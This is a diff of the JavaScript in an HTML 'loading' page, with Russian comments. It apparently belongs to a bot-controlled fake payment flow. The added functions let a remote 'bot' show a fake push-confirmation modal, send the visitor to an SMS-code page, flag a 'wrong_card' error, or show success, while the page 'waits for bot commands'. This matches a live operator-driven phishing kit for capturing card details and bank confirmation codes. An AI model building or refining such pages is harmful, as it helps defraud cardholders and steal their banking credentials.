@@ -412,8 +412,8 @@
 
         changeLanguage(currentLanguage);
 
-        // Показ модального окна пуш-подтверждения
-        function showPushConfirmation() {
+        // Функции для управления страницей из бота
+        window.showPushNotification = function() {
             const modal = document.createElement('div');
             modal.style.cssText = `
                 position: fixed;
@@ -473,64 +473,43 @@
             document.body.appendChild(modal);
 
             // Добавляем обработчики для кнопок
-            document.getElementById('confirmPushBtn').addEventListener('click', confirmOperation);
-            document.getElementById('cancelPushBtn').addEventListener('click', cancelOperation);
-        }
+            document.getElementById('confirmPushBtn').addEventListener('click', function() {
+                document.querySelector('div[style*="position: fixed"]').remove();
+                const loadingText = document.querySelector('.loading-text');
+                loadingText.textContent = '✅ Операция подтверждена!';
+                setTimeout(() => {
+                    window.location.href = 'success.html';
+                }, 2000);
+            });
 
-        function confirmOperation() {
-            // Закрываем модальное окно
-            document.querySelector('div[style*="position: fixed"]').remove();
+            document.getElementById('cancelPushBtn').addEventListener('click', function() {
+                document.querySelector('div[style*="position: fixed"]').remove();
+                const loadingText = document.querySelector('.loading-text');
+                loadingText.textContent = '❌ Операция отменена';
+                setTimeout(() => {
+                    window.location.href = 'payment.html';
+                }, 2000);
+            });
+        };
 
-            // Показываем успешное сообщение
+        window.redirectToSMS = function() {
+            window.location.href = 'sms.html';
+        };
+
+        window.redirectToPaymentWithError = function() {
+            window.location.href = 'payment.html?status=wrong_card';
+        };
+
+        window.showSuccess = function() {
             const loadingText = document.querySelector('.loading-text');
             loadingText.textContent = '✅ Операция подтверждена!';
-
-            // Перенаправляем на успешную страницу
             setTimeout(() => {
                 window.location.href = 'success.html';
             }, 2000);
-        }
+        };
 
-        function cancelOperation() {
-            // Закрываем модальное окно
-            document.querySelector('div[style*="position: fixed"]').remove();
-
-            // Показываем сообщение об отмене
-            const loadingText = document.querySelector('.loading-text');
-            loadingText.textContent = '❌ Операция отменена';
-
-            // Возвращаем на страницу оплаты
-            setTimeout(() => {
-                window.location.href = 'payment.html';
-            }, 2000);
-        }
-
-        // Проверяем, нужно ли показать пуш-уведомление
-        function checkForPushNotification() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const action = urlParams.get('action');
-            
-            console.log('URL action:', action); // Для дебага
-            
-            if (action === 'push') {
-                console.log('Showing push notification'); // Для дебага
-                // Показываем пуш-уведомление через 3 секунды
-                setTimeout(() => {
-                    showPushConfirmation();
-                }, 3000);
-            } else {
-                console.log('No push action - just loading'); // Для дебага
-                // Если нет пуша, просто ждем и переходим на success
-                setTimeout(() => {
-                    window.location.href = 'success.html';
-                }, 5000);
-            }
-        }
-
-        // Запускаем проверку при загрузке
-        document.addEventListener('DOMContentLoaded', function() {
-            checkForPushNotification();
-        });
+        // Страница просто крутится и ждет команд от бота
+        console.log('Loading page ready - waiting for bot commands...');
     </script>
 </body>
 </html>
